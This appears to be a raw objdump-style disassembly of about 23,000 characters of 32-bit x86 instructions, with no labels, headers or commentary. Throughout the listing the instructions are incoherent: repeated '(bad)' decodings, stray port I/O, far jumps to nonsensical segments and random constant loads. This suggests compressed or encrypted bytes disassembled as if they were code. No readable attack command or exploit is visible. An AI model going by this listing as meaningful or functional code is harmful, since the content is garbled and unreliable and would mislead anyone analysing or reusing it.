  415f0e:	and    DWORD PTR [ebp+0x17],0xffffffdb
  415f12:	cmp    al,dl
  415f14:	out    0xc1,eax
  415f16:	cdq    
  415f17:	loope  0x415f62
  415f19:	mov    eax,0xa44c5f3d
  415f1e:	imul   eax,ecx,0xffffffe8
  415f21:	mov    dh,0x13
  415f23:	cmp    dh,ah
  415f25:	das    
  415f26:	lods   al,BYTE PTR ds:[esi]
  415f27:	sbb    dh,al
  415f29:	cld    
  415f2a:	sbb    eax,0xb07d768
  415f2f:	and    eax,0x2b8faff9
  415f34:	mov    ch,0xc6
  415f36:	cmp    eax,0xffac292b
  415f3b:	and    DWORD PTR [ebp+ebp*2+0xe87dc9f],0xffffffc1
  415f43:	push   ebp
  415f44:	fisttp QWORD PTR [edx+0x45]
  415f47:	adc    edx,eax
  415f49:	(bad)  
  415f4b:	call   0x746bfd27
  415f50:	das    
  415f51:	mov    esp,0x78e26afd
  415f56:	cmp    bl,ah
  415f58:	jg     0x415fa7
  415f5a:	jmp    0x5058:0x2654fbef
  415f61:	fld    st(4)
  415f63:	jae    0x415fb3
  415f65:	pop    edx
  415f66:	stos   BYTE PTR es:[edi],al
  415f67:	(bad)  [eax]
  415f69:	mov    ds:0xc58d8081,al
  415f6e:	dec    eax
  415f6f:	sub    eax,0x4627849b
  415f74:	gs push edi
  415f76:	and    dl,BYTE PTR [ebx+0x43516dc]
  415f7c:	inc    ecx
  415f7d:	and    BYTE PTR [eax+0x12],cl
  415f80:	mov    ebp,0xb75daaed
  415f85:	pop    edx
  415f86:	addr16 fsqrt 
  415f89:	fild   WORD PTR [esi-0x37f63631]
  415f8f:	mov    al,0xb6
  415f91:	push   esp
  415f92:	loop   0x415f3a
  415f94:	mov    edx,DWORD PTR [edx+0xda851f3]
  415f9a:	mov    esp,0x1a59c837
  415f9f:	cmp    al,0x5b
  415fa1:	jge    0x415f6c
  415fa3:	in     al,0x86
  415fa5:	dec    eax
  415fa6:	xchg   edx,eax
  415fa7:	push   0x3d430742
  415fac:	(bad)  
  415fae:	call   0x9ec66bac
  415fb3:	idiv   DWORD PTR ds:0x28ff8fac
  415fb9:	imul   DWORD PTR [edi+0x1b]
  415fbc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415fbd:	and    ch,BYTE PTR [ebp+0x24]
  415fc0:	lahf   
  415fc1:	repnz ins BYTE PTR es:[edi],dx
  415fc3:	dec    eax
  415fc4:	xchg   esi,eax
  415fc5:	stc    
  415fc6:	(bad)  
  415fc7:	ja     0x416009
  415fc9:	imul   eax,ecx,0x69
  415fcc:	ins    BYTE PTR es:[edi],dx
  415fcd:	lea    ebx,[ecx+0x7e]
  415fd0:	test   al,0x3f
  415fd2:	dec    eax
  415fd3:	xor    DWORD PTR [ecx],eax
  415fd5:	xchg   edx,eax
  415fd6:	fnstcw WORD PTR ds:0x44f73895
  415fdc:	out    dx,al
  415fdd:	mov    ecx,0x73e4db37
  415fe2:	rcr    BYTE PTR [edi-0x77a35578],0x4d
  415fe9:	div    dh
  415feb:	cmp    DWORD PTR ds:0x5a6e,ebp
  415ff0:	or     al,0x44
  415ff2:	cli    
  415ff3:	lea    esi,[eax]
  415ff5:	mov    ds:0xea23415f,al
  415ffa:	mov    esp,0xe66a2925
  415fff:	fwait
  416000:	jno    0x415fe9
  416002:	mov    DWORD PTR [ecx],ecx
  416004:	(bad)  
  416005:	mov    eax,0x5a60fa69
  41600a:	sbb    eax,DWORD PTR [edx-0x5b8a3a87]
  416010:	out    dx,al
  416011:	push   esp
  416012:	sbb    eax,0x1f90a799
  416017:	ins    BYTE PTR es:[edi],dx
  416018:	cld    
  416019:	enter  0x858f,0x68
  41601d:	out    0xfe,eax
  41601f:	fisub  WORD PTR [ebx-0x2e82ff35]
  416025:	(bad)  
  416026:	dec    BYTE PTR [esi+ecx*2+0x71]
  41602a:	mov    WORD PTR [ecx-0x262729e5],ss
  416030:	test   eax,0xec350cc6
  416035:	adc    al,0x34
  416037:	sub    eax,0x82c3a714
  41603c:	bound  ecx,QWORD PTR [ebx]
  41603e:	jbe    0x4160ac
  416040:	bound  ebp,QWORD PTR [esi+ebx*8]
  416043:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416044:	push   cs
  416045:	nop
  416046:	adc    al,0xec
  416048:	or     edi,esp
  41604a:	xchg   ebp,eax
  41604b:	jns    0x416044
  41604d:	inc    esi
  41604e:	setno  BYTE PTR ds:0x520cc583
  416055:	shl    BYTE PTR [edx-0x1a],1
  416058:	stc    
  416059:	out    dx,eax
  41605a:	sub    BYTE PTR [esi+0x36],ch
  41605d:	xor    BYTE PTR [ebp+0x1f],dh
  416060:	mov    ds:0x2a4a477a,eax
  416065:	retf   
  416066:	retf   0x1eff
  416069:	sar    BYTE PTR [ecx],1
  41606b:	sub    eax,0xdd1e5114
  416070:	or     eax,0x2a82f950
  416075:	in     eax,0xe9
  416077:	mov    eax,DWORD PTR [edx]
  416079:	loope  0x416080
  41607b:	mov    dl,0xab
  41607d:	xchg   esp,eax
  41607e:	add    al,0x1b
  416080:	mov    al,ds:0x139d6704
  416085:	mov    ds:0x55ed7413,eax
  41608a:	nop
  41608b:	xchg   bh,dl
  41608d:	lods   al,BYTE PTR ds:[esi]
  41608e:	add    ecx,DWORD PTR [edx+0x3d7c2979]
  416094:	dec    ebp
  416095:	aas    
  416096:	inc    esp
  416097:	call   0xbdd:0xd80bae03
  41609e:	test   eax,0xbbba5d57
  4160a3:	mov    ds:0x82a6559d,eax
  4160a8:	test   dl,ah
  4160aa:	ss ss enter 0x1c04,0xc9
  4160b0:	mov    dl,0x0
  4160b2:	mov    cl,0x86
  4160b4:	adc    al,0xa5
  4160b6:	das    
  4160b7:	rcr    edx,0x57
  4160ba:	popf   
  4160bb:	mov    al,0x81
  4160bd:	lgs    eax,FWORD PTR es:[eax]
  4160c1:	cmp    DWORD PTR [ebx+0x26e57b03],0xb2e28c8c
  4160cb:	lea    esp,[ebx-0x2c9787f]
  4160d1:	jbe    0x4160d8
  4160d3:	and    cl,BYTE PTR [edi-0x77]
  4160d6:	out    dx,al
  4160d7:	adc    eax,0x6958b582
  4160dc:	push   esp
  4160dd:	and    ebx,DWORD PTR [eax]
  4160df:	cmp    edx,edx
  4160e1:	pop    es
  4160e2:	sbb    DWORD PTR [edi-0x21],eax
  4160e5:	jmp    0xf751f204
  4160ea:	adc    DWORD PTR [ecx-0x4389048e],ebx
  4160f0:	mov    ch,0xf3
  4160f2:	xchg   ebp,eax
  4160f3:	pop    esp
  4160f4:	or     ebx,ecx
  4160f6:	mov    al,0x54
  4160f8:	ss pop edx
  4160fa:	push   eax
  4160fb:	dec    ecx
  4160fc:	lods   al,BYTE PTR ds:[esi]
  4160fd:	sub    ebx,ebp
  4160ff:	add    BYTE PTR [ebx],0x1b
  416102:	push   0xcdea4612
  416107:	mov    DWORD PTR [ebp+0x1831e4cc],eax
  41610d:	(bad)  
  41610f:	ror    DWORD PTR [edx-0x2fe0055f],cl
  416115:	mov    ebx,0xb93f48bf
  41611a:	dec    ecx
  41611b:	jp     0x416108
  41611d:	lock mov eax,0x3bd5c3e
  416123:	clc    
  416124:	sbb    eax,0x8c3b2e4c
  416129:	lahf   
  41612a:	xor    ebx,DWORD PTR [edx+0x3a]
  41612d:	repz adc eax,0x9b736218
  416133:	mov    eax,ds:0xd57af194
  416138:	mov    eax,ds:0xb029188
  41613d:	mov    edi,0x98e192f4
  416142:	addr16 xchg ebx,eax
  416144:	jnp    0x4160d5
  416146:	adc    eax,0xc97fbc01
  41614b:	xchg   ecx,eax
  41614c:	mov    ebp,0xa81c8f8e
  416151:	jnp    0x4161cb
  416153:	push   edi
  416154:	or     eax,0xc9a52d60
  416159:	mov    ss,WORD PTR [edx+eax*4-0x22]
  41615d:	inc    ebp
  41615e:	mul    ch
  416160:	gs push 0x4
  416163:	add    bh,BYTE PTR [ecx+0x1f78d1c5]
  416169:	ret    0x9b96
  41616c:	jl     0x41618d
  41616e:	mov    edx,0x784f116f
  416173:	(bad)  
  416174:	adc    dh,BYTE PTR [esi+0x53721caf]
  41617a:	xchg   edx,eax
  41617b:	mov    ecx,0xbf5720b7
  416180:	bound  ecx,QWORD PTR [ecx+esi*1-0x80]
  416184:	jmp    0xdec39b90
  416189:	ror    DWORD PTR [ecx+ebp*2],0xc4
  41618d:	sub    edx,DWORD PTR [esi]
  41618f:	jecxz  0x41619e
  416191:	jb     0x4161e8
  416193:	in     al,dx
  416194:	jmp    0xd8c77348
  416199:	aaa    
  41619a:	pop    edi
  41619b:	xchg   ebx,eax
  41619c:	jns    0x4161f5
  41619e:	pop    ebp
  41619f:	jmp    0x416136
  4161a1:	arpl   dx,bx
  4161a3:	pop    ss
  4161a4:	int3   
  4161a5:	push   ebp
  4161a6:	cmp    DWORD PTR [esi],ebp
  4161a8:	mov    ebx,0xbf8c58ca
  4161ad:	call   0x13be:0x31c3f1d4
  4161b4:	pop    ss
  4161b5:	daa    
  4161b6:	push   ebx
  4161b7:	aas    
  4161b8:	(bad)  
  4161b9:	scas   al,BYTE PTR es:[edi]
  4161ba:	test   al,0xd3
  4161bc:	xor    DWORD PTR [edx],ebp
  4161be:	cmp    BYTE PTR [edi+edi*1+0x38],bl
  4161c2:	iret   
  4161c3:	loope  0x4161ab
  4161c5:	jae    0x4161a4
  4161c7:	sub    esi,esi
  4161c9:	jle    0x416247
  4161cb:	les    esi,FWORD PTR [ebx+esi*4+0x5]
  4161cf:	mov    ds:0xe2a64655,eax
  4161d4:	mul    DWORD PTR [eax+0x2]
  4161d7:	popf   
  4161d8:	push   cs
  4161d9:	outs   dx,BYTE PTR ds:[esi]
  4161da:	nop
  4161db:	lea    esi,[eax-0x2df6eff7]
  4161e1:	push   es
  4161e2:	cmp    esi,DWORD PTR [ecx-0x66ece868]
  4161e8:	ins    BYTE PTR es:[edi],dx
  4161e9:	sar    DWORD PTR [esi-0x1],0x7b
  4161ed:	fst    st(5)
  4161ef:	outs   dx,BYTE PTR ds:[esi]
  4161f0:	push   ecx
  4161f1:	adc    edx,DWORD PTR [ebx+0x54895704]
  4161f7:	mov    cl,BYTE PTR [edx-0x5d347f46]
  4161fd:	aaa    
  4161fe:	or     edx,DWORD PTR [edx-0xace7e95]
  416204:	not    BYTE PTR [edx]
  416206:	lods   eax,DWORD PTR ds:[esi]
  416207:	sbb    ch,dh
  416209:	retf   0x66a9
  41620c:	mov    al,0xac
  41620e:	mov    ecx,0xb470863d
  416213:	cli    
  416214:	mov    ecx,0xb8bffc49
  416219:	cmp    eax,0xc3b7b400
  41621e:	ss rcr ebx,1
  416221:	sbb    al,0xea
  416223:	xchg   BYTE PTR [esi-0x33],ah
  416226:	xchg   ebp,eax
  416227:	shl    BYTE PTR [edi+0xe580be6],cl
  41622d:	sub    al,0x6f
  41622f:	mov    esi,0xceb83175
  416234:	or     BYTE PTR [edx+0x5a6c9580],0xd7
  41623b:	or     dl,cl
  41623d:	out    dx,eax
  41623e:	xchg   DWORD PTR [ebx-0x14],edx
  416241:	(bad)  
  416242:	sbb    bl,dl
  416244:	jmp    0xc886:0xce42330
  41624b:	test   BYTE PTR [esi+eax*4+0x3d],bh
  41624f:	test   eax,0x16d4557a
  416254:	and    ecx,ecx
  416256:	(bad)
  41625a:	cmp    edx,DWORD PTR [ecx-0x6f0ec853]
  416260:	neg    DWORD PTR [esi]
  416262:	or     DWORD PTR [eax+0x54afa4a6],ebx
  416268:	push   es
  416269:	call   0xbb03259c
  41626e:	or     ecx,DWORD PTR [eax+0x5dbc6122]
  416274:	or     al,0xe3
  416276:	xor    BYTE PTR [ecx],bh
  416278:	cmp    al,0xe0
  41627a:	stos   DWORD PTR es:[edi],eax
  41627b:	sti    
  41627c:	add    DWORD PTR [esi],0x40
  41627f:	jle    0x41624b
  416281:	or     BYTE PTR [ebx],dl
  416283:	(bad)  
  416284:	mov    eax,ds:0xa4414546
  416289:	je     0x416228
  41628b:	loop   0x416261
  41628d:	mov    esi,esi
  41628f:	cld    
  416290:	shl    edi,cl
  416292:	push   0x1bd81be7
  416297:	loopne 0x416272
  416299:	xor    eax,0xf0c82a68
  41629e:	jns    0x4162b9
  4162a0:	jg     0x416283
  4162a2:	push   cs
  4162a3:	mov    dh,0x8c
  4162a5:	pop    ss
  4162a6:	ret    0x40ce
  4162a9:	and    DWORD PTR [ecx-0x26004140],0x6
  4162b0:	mov    cl,0x8a
  4162b2:	lea    edx,[ecx+0x3bd4c0a3]
  4162b8:	sbb    DWORD PTR [eax+0x76055668],ebp
  4162be:	shl    DWORD PTR [eax+0x7a62ba40],0xa1
  4162c5:	idiv   BYTE PTR [edx-0x4f70439a]
  4162cb:	mov    al,ds:0xf93a694c
  4162d0:	gs ins DWORD PTR es:[edi],dx
  4162d2:	mov    ds:0x3c5f29ff,al
  4162d7:	loopne 0x4162b8
  4162d9:	mov    BYTE PTR [esi-0x31],0xa5
  4162dd:	dec    edi
  4162de:	xchg   ecx,eax
  4162df:	fldcw  WORD PTR [ecx+0x10]
  4162e2:	fs test al,0xd4
  4162e5:	ret    
  4162e6:	cwde   
  4162e7:	lds    esi,FWORD PTR [ecx+0x1a]
  4162ea:	jg     0x416306
  4162ec:	es jp  0x41631d
  4162ef:	mov    ebx,0xf10111e2
  4162f4:	push   ebx
  4162f5:	aam    0xe4
  4162f7:	loope  0x416297
  4162f9:	cwde   
  4162fa:	(bad)  
  4162fb:	shl    esi,cl
  4162fd:	adc    DWORD PTR [eax+0x77],ebx
  416300:	pop    es
  416301:	pop    ebx
  416302:	add    al,0x8c
  416304:	(bad)  
  416305:	or     al,0xa9
  416307:	iret   
  416308:	es aaa 
  41630a:	call   0x339a6f31
  41630f:	xchg   DWORD PTR [ecx],edi
  416311:	mov    esp,0x24883cdd
  416316:	mov    DWORD PTR [eax-0x65],edi
  416319:	lods   al,BYTE PTR ds:[esi]
  41631a:	pop    ebx
  41631b:	sub    esi,DWORD PTR [eax+0x146f699c]
  416321:	outs   dx,BYTE PTR ds:[esi]
  416322:	and    eax,0xba2eab84
  416327:	mov    ds:0xc1e0e05e,al
  41632c:	mov    DWORD PTR [edx],edx
  41632e:	ret    0xefbb
  416331:	cdq    
  416332:	shl    DWORD PTR [ecx+0x11edf],1
  416338:	sub    BYTE PTR [ebx+ebp*2],bl
  41633b:	mov    dl,0xa9
  41633d:	outs   dx,DWORD PTR ds:[esi]
  41633e:	cmp    al,0x65
  416340:	shl    BYTE PTR ds:0x8506e0fb,cl
  416346:	jmp    0x416366
  416348:	(bad)  
  41634a:	loope  0x41633e
  41634c:	stc    
  41634d:	xor    eax,0x60c60696
  416352:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416353:	out    dx,al
  416354:	sbb    esp,DWORD PTR [eax-0x2]
  416357:	sub    eax,DWORD PTR [eax+0x17]
  41635a:	jl     0x416384
  41635c:	mov    eax,0x1e1d1287
  416361:	aam    0x51
  416363:	pusha  
  416364:	pop    ebp
  416365:	stc    
  416366:	sbb    ecx,DWORD PTR [eax+0x5e]
  416369:	xor    al,0xef
  41636b:	mov    ?,edi
  41636d:	aad    0x9d
  41636f:	dec    ebp
  416370:	mov    ah,0x68
  416372:	aam    0x27
  416374:	lock jmp 0x4163d1
  416377:	adc    eax,0xa5f1cdb7
  41637c:	push   ss
  41637d:	sbb    al,0x9f
  41637f:	jne    0x4163b8
  416381:	mov    cl,0xdd
  416383:	in     eax,dx
  416384:	xor    al,0x4
  416386:	xor    bh,BYTE PTR [ebx+0x4]
  416389:	push   0x755de424
  41638e:	(bad)  
  41638f:	push   0xffffffe9
  416391:	xlat   BYTE PTR ds:[ebx]
  416392:	add    cx,WORD PTR [ebp-0x4fd2e959]
  416399:	adc    al,0x90
  41639b:	pop    edx
  41639c:	fmul   QWORD PTR [eax+0x0]
  41639f:	jmp    FWORD PTR ds:[esi+ecx*4-0x1]
  4163a4:	mov    WORD PTR [ebx],gs
  4163a6:	icebp  
  4163a7:	inc    edx
  4163a8:	(bad)  
  4163aa:	and    bl,dl
  4163ac:	mov    ecx,0x759ed223
  4163b1:	pop    esp
  4163b2:	sbb    al,0x45
  4163b4:	and    eax,DWORD PTR [eax+0x47]
  4163b7:	and    ah,BYTE PTR ss:[edi+0x5b407bbd]
  4163be:	addr16 mov edi,0xa198971f
  4163c4:	cld    
  4163c5:	xchg   DWORD PTR [eax+0x18],esp
  4163c8:	push   0x45
  4163ca:	fcomp  QWORD PTR [esi]
  4163cc:	xchg   esi,eax
  4163cd:	adc    al,cl
  4163cf:	inc    esi
  4163d0:	dec    eax
  4163d1:	in     al,dx
  4163d2:	push   ds
  4163d3:	(bad)  
  4163d5:	pushf  
  4163d6:	neg    BYTE PTR ds:0x293361df
  4163dc:	sub    DWORD PTR [esi+ebx*4+0x4c093450],edi
  4163e3:	mov    bh,0xd2
  4163e5:	sbb    bh,ch
  4163e7:	mov    edi,0x7f179050
  4163ec:	leave  
  4163ed:	imul   edx,eax,0x1f
  4163f0:	push   es
  4163f1:	push   ebx
  4163f2:	mov    al,ds:0xc074bb8b
  4163f7:	mov    bh,BYTE PTR [edi]
  4163f9:	xor    dh,BYTE PTR [ebx-0x7437221c]
  4163ff:	pop    eax
  416400:	les    ebx,FWORD PTR [ebx+edi*2+0x37]
  416404:	dec    ecx
  416405:	mov    eax,0x746656a0
  41640a:	xor    BYTE PTR [ebp-0x66],dl
  41640d:	cmp    bh,BYTE PTR ds:0x86d419fd
  416413:	push   eax
  416414:	or     al,0xe3
  416416:	setge  BYTE PTR [edx]
  416419:	xchg   BYTE PTR [ebx+eax*2-0x46],bl
  41641d:	cmp    DWORD PTR [eax+eax*2+0x29],edx
  416421:	inc    edi
  416422:	dec    ebx
  416423:	dec    ebp
  416424:	add    DWORD PTR [edx],esi
  416426:	push   eax
  416427:	lods   eax,DWORD PTR ss:[esi]
  416429:	in     al,dx
  41642a:	mov    edx,0xd624ca1c
  41642f:	pop    esi
  416430:	adc    BYTE PTR [edi+edx*4+0x74],ch
  416434:	xchg   edi,eax
  416435:	and    eax,0x503dfbb6
  41643a:	mov    edx,0xd294ca5b
  41643f:	imul   eax,DWORD PTR [ebp-0x68],0x5b250248
  416446:	adc    al,0x58
  416448:	inc    ecx
  416449:	fiadd  DWORD PTR [ebx]
  41644b:	inc    edi
  41644c:	outs   dx,DWORD PTR ds:[esi]
  41644d:	popa   
  41644e:	fild   DWORD PTR [eiz*4-0x52b9bcf]
  416455:	push   cs
  416456:	sub    DWORD PTR [edx-0x46],ecx
  416459:	test   ecx,ebx
  41645b:	jmp    0x490a:0x88885236
  416462:	mov    ds:0x3db0c1b5,al
  416467:	mov    dl,0xf0
  416469:	adc    ecx,esp
  41646b:	xchg   edi,eax
  41646c:	repz aad 0xb9
  41646f:	(bad)  
  416470:	lahf   
  416471:	fild   QWORD PTR [edi+0x7]
  416474:	das    
  416475:	int3   
  416476:	xor    eax,0xd4469843
  41647b:	pop    edx
  41647c:	stc    
  41647d:	ss iret 
  41647f:	shr    DWORD PTR ds:0x5da8257e,cl
  416485:	fst    QWORD PTR [ecx-0x56]
  416488:	jne    0x416445
  41648a:	fcomp  DWORD PTR [ecx]
  41648c:	dec    ecx
  41648d:	aaa    
  41648e:	stos   DWORD PTR es:[edi],eax
  41648f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416490:	cmp    DWORD PTR [esi],ebp
  416492:	test   al,0x38
  416494:	lods   al,BYTE PTR ds:[esi]
  416495:	cmp    eax,DWORD PTR [esp+edx*2+0x6c]
  416499:	inc    ebp
  41649a:	pop    ecx
  41649b:	es lock in eax,dx
  41649e:	sub    BYTE PTR [ecx-0x1fbafb11],bl
  4164a4:	or     edi,DWORD PTR [esi]
  4164a6:	mov    edx,es
  4164a8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4164a9:	add    DWORD PTR [eax-0x370e3362],ebx
  4164af:	and    bl,al
  4164b1:	cs in  al,dx
  4164b3:	(bad)  
  4164b4:	inc    edi
  4164b5:	hlt    
  4164b6:	idiv   dl
  4164b8:	fst    st(4)
  4164ba:	xchg   ebp,eax
  4164bb:	mov    dh,0xb6
  4164bd:	push   eax
  4164be:	mov    DWORD PTR [ebx+0x6910b815],ecx
  4164c4:	jo     0x4164cc
  4164c6:	(bad)
  4164c9:	push   ecx
  4164ca:	xchg   ebx,eax
  4164cb:	or     eax,0x97d95f13
  4164d0:	xor    DWORD PTR [edi-0x2bc3bc62],ebp
  4164d6:	or     ch,ah
  4164d8:	mov    ah,0x77
  4164da:	imul   esi,DWORD PTR [ebp-0x5dab3333],0xcee7c13b
  4164e4:	out    0x22,al
  4164e6:	dec    eax
  4164e7:	pop    ebp
  4164e8:	cmp    ah,al
  4164ea:	sti    
  4164eb:	fdiv   QWORD PTR [eax-0x48209f1d]
  4164f1:	push   cs
  4164f2:	clc    
  4164f3:	jae    0x41648e
  4164f5:	sbb    eax,ecx
  4164f7:	shr    BYTE PTR [ebx+0x30779362],0x3f
  4164fe:	aaa    
  4164ff:	inc    eax
  416500:	mov    eax,DWORD PTR [eax+edx*1]
  416503:	or     BYTE PTR [edi-0x7f5c2a62],0x52
  41650a:	fwait
  41650b:	xor    DWORD PTR [esi-0x5f],esi
  41650e:	add    esi,DWORD PTR [edi+eax*8]
  416511:	jmp    0x57c4bf81
  416516:	jmp    0x7ef6e015
  41651b:	inc    ebp
  41651c:	adc    DWORD PTR [esi],eax
  41651e:	xchg   ebx,eax
  41651f:	pop    eax
  416520:	aaa    
  416521:	fs xchg ebx,eax
  416523:	or     dh,BYTE PTR [ebp-0x60de2294]
  416529:	jns    0x4164df
  41652b:	cmp    al,0x50
  41652d:	and    bl,BYTE PTR [ebp+0x4ba8a2f1]
  416533:	into   
  416534:	sbb    al,0x55
  416536:	js     0x416525
  416538:	xlat   BYTE PTR ds:[ebx]
  416539:	daa    
  41653a:	sbb    bh,BYTE PTR [eax-0x1f]
  41653d:	sub    ebx,DWORD PTR [esi+0x5b94db55]
  416543:	sbb    ah,BYTE PTR [edi]
  416545:	pop    ebx
  416546:	mov    bl,0x53
  416548:	mov    DWORD PTR [edx+0x1a],ecx
  41654b:	dec    esi
  41654c:	xchg   ebp,eax
  41654d:	out    dx,eax
  41654e:	pop    ds
  41654f:	idiv   edi
  416551:	sub    eax,0xa0734040
  416556:	sub    al,0x40
  416558:	bound  ecx,QWORD PTR [edi+0x5d]
  41655b:	lds    edi,FWORD PTR [esi]
  41655d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41655e:	jg     0x416586
  416560:	cmp    dh,BYTE PTR [ebx]
  416562:	pop    esp
  416563:	neg    BYTE PTR [ebx]
  416565:	shr    DWORD PTR [ebp+eax*4+0x3d],1
  416569:	(bad)  
  41656a:	nop
  41656b:	cmp    al,0xec
  41656d:	push   edx
  41656e:	rcr    DWORD PTR [ebx-0x39],cl
  416571:	or     BYTE PTR [eax+edi*2-0x18d6ac4e],al
  416578:	cmc    
  416579:	xor    eax,0xf7cf9d46
  41657e:	clc    
  41657f:	mov    esp,0xdba8de63
  416584:	scas   eax,DWORD PTR es:[edi]
  416585:	fwait
  416586:	js     0x4165a0
  416588:	adc    ebp,DWORD PTR [ebp-0x40]
  41658b:	cmp    eax,0x665dc88
  416590:	hlt    
  416591:	jno    0x416571
  416593:	data16 fistp QWORD PTR [ebp+0x1e6c2ae0]
  41659a:	std    
  41659b:	test   DWORD PTR [edx-0x605e8f2c],ebx
  4165a1:	int3   
  4165a2:	cld    
  4165a3:	adc    eax,DWORD PTR ds:0xc3748d7a
  4165a9:	(bad)  
  4165aa:	out    0xb,al
  4165ac:	sbb    ecx,edi
  4165ae:	and    DWORD PTR [ecx],esi
  4165b0:	xchg   edx,eax
  4165b1:	mov    dh,0x70
  4165b3:	sbb    al,0x9d
  4165b5:	pop    edi
  4165b6:	or     al,0x93
  4165b8:	mov    WORD PTR [esi+esi*1+0x203ac39d],cs
  4165bf:	pop    esi
  4165c0:	movzx  edi,BYTE PTR [edx+0x1f0e0474]
  4165c7:	jle    0x4165fd
  4165c9:	fnstsw WORD PTR [edx+0x63]
  4165cc:	ja     0x41655d
  4165ce:	aam    0x43
  4165d0:	fmul   DWORD PTR [edi+eiz*2+0x2b]
  4165d4:	mov    bh,0x95
  4165d6:	cmp    edx,ebp
  4165d8:	mov    ds:0xbb3c3631,eax
  4165dd:	call   DWORD PTR [ebp-0x45]
  4165e0:	rol    BYTE PTR [ebp+0x71],0xfd
  4165e4:	adc    al,0xef
  4165e6:	xor    eax,0xe9f99ba7
  4165eb:	pop    eax
  4165ec:	dec    ecx
  4165ed:	cs mov eax,edi
  4165f0:	aaa    
  4165f1:	in     al,dx
  4165f2:	fst    st(6)
  4165f4:	packssdw mm2,QWORD PTR [ecx+0x6a]
  4165f8:	mov    bh,0x95
  4165fa:	scas   eax,DWORD PTR es:[edi]
  4165fb:	mov    bl,0x95
  4165fd:	lods   eax,DWORD PTR ds:[esi]
  4165fe:	mov    edx,0x28bd6d61
  416603:	add    edi,ebp
  416605:	jg     0x416631
  416607:	aas    
  416608:	fsubrp st(3),st
  41660a:	inc    eax
  41660b:	pop    ss
  41660c:	xchg   edi,eax
  41660d:	rcr    BYTE PTR [edx],1
  41660f:	iret   
  416610:	mov    edx,0x7e7f4606
  416615:	mov    al,ds:0x38896ac8
  41661a:	retf   0x7ec9
  41661d:	scas   al,BYTE PTR es:[edi]
  41661e:	stos   DWORD PTR es:[edi],eax
  41661f:	and    BYTE PTR [ebx-0x37],dh
  416622:	stos   DWORD PTR es:[edi],eax
  416623:	aam    0x55
  416625:	mov    esp,0x2681684f
  41662a:	mov    cl,0x48
  41662c:	ja     0x4165d3
  41662e:	add    al,0x7f
  416630:	push   ebx
  416631:	jp     0x416664
  416633:	jl     0x41663f
  416635:	ret    
  416636:	rcl    BYTE PTR [edi-0x67e19295],cl
  41663c:	jbe    0x4166b4
  41663e:	jmp    0x2a28d27a
  416643:	ja     0x4166a0
  416645:	jo     0x4166b8
  416647:	daa    
  416648:	mov    al,0x37
  41664a:	xlat   BYTE PTR ds:[ebx]
  41664b:	sbb    eax,0x2805210c
  416650:	pop    ebx
  416651:	jb     0x41669a
  416653:	ins    DWORD PTR es:[edi],dx
  416654:	arpl   WORD PTR [edi+0x6b],bx
  416657:	push   0x19d2294c
  41665c:	jp     0x416603
  41665e:	push   ecx
  41665f:	imul   esi,DWORD PTR [esi],0x50
  416662:	out    0x48,eax
  416664:	jb     0x416663
  416666:	lock mov ecx,DWORD PTR [esi+0x6bfc68f1]
  41666d:	cmp    eax,0xbb73ce06
  416672:	sbb    eax,0x7895a23b
  416677:	dec    ecx
  416678:	loop   0x416654
  41667a:	push   esi
  41667b:	cmp    eax,0x38088ea2
  416680:	mov    esi,0x39769db0
  416685:	pop    ebp
  416686:	ins    DWORD PTR es:[edi],dx
  416687:	sub    al,0x39
  416689:	ins    DWORD PTR es:[edi],dx
  41668a:	cmp    DWORD PTR ds:0x1d7d20c6,esp
  416690:	jl     0x4166ca
  416692:	sbb    edi,DWORD PTR [ebx+0x683814e0]
  416698:	jg     0x4166d5
  41669a:	inc    DWORD PTR [esi+edx*8+0x5d060350]
  4166a1:	inc    esp
  4166a2:	scas   al,BYTE PTR es:[edi]
  4166a3:	imul   edx,DWORD PTR [ecx+0x7],0xffffffb1
  4166a7:	inc    esi
  4166a8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4166a9:	lods   eax,DWORD PTR ds:[esi]
  4166aa:	fdiv   QWORD PTR ds:0xfccf1da1
  4166b0:	hlt    
  4166b1:	int3   
  4166b2:	sub    bh,BYTE PTR [esi]
  4166b4:	mov    edx,0xb264e0b3
  4166b9:	dec    esp
  4166ba:	jg     0x4166ed
  4166bc:	popf   
  4166bd:	and    eax,0x9c361011
  4166c2:	das    
  4166c3:	sub    bh,al
  4166c5:	call   0x4973:0x9fcf0d4a
  4166cc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4166cd:	iret   
  4166ce:	xchg   edx,eax
  4166cf:	daa    
  4166d0:	or     eax,0x161ef977
  4166d5:	sar    DWORD PTR [edi-0x306da7d0],cl
  4166db:	add    DWORD PTR [edx-0x4fafea75],edi
  4166e1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4166e2:	aaa    
  4166e3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4166e4:	ins    BYTE PTR es:[edi],dx
  4166e5:	jg     0x4166ad
  4166e7:	into   
  4166e8:	stc    
  4166e9:	xor    BYTE PTR ds:0x98bf8dc7,dh
  4166ef:	inc    esp
  4166f0:	ja     0x416708
  4166f2:	jmp    0xa441:0x7b0c9d33
  4166f9:	popa   
  4166fa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4166fb:	jbe    0x4166a9
  4166fd:	and    eax,0x2ff0cde4
  416702:	adc    al,0x52
  416704:	fld    DWORD PTR [ebx-0x5a]
  416707:	inc    esi
  416708:	or     DWORD PTR [edx+0x15],ebx
  41670b:	add    bl,BYTE PTR [esi-0x1d]
  41670e:	rcl    BYTE PTR [ecx+ebp*4-0x6aaf1d6d],cl
  416715:	outs   dx,BYTE PTR ds:[esi]
  416716:	cwde   
  416717:	sub    ebx,ebp
  416719:	test   DWORD PTR [ebx],edi
  41671b:	loope  0x416732
  41671d:	sub    esi,esi
  41671f:	out    0x1a,al
  416721:	test   al,0xbb
  416723:	xor    DWORD PTR ds:0x5137a0d3,esi
  416729:	xchg   ebx,eax
  41672a:	pop    esi
  41672b:	jmp    0xc7e6253f
  416730:	inc    ecx
  416731:	sub    bl,ah
  416733:	nop
  416734:	inc    edi
  416735:	inc    ebx
  416736:	loop   0x41675d
  416738:	je     0x4166c0
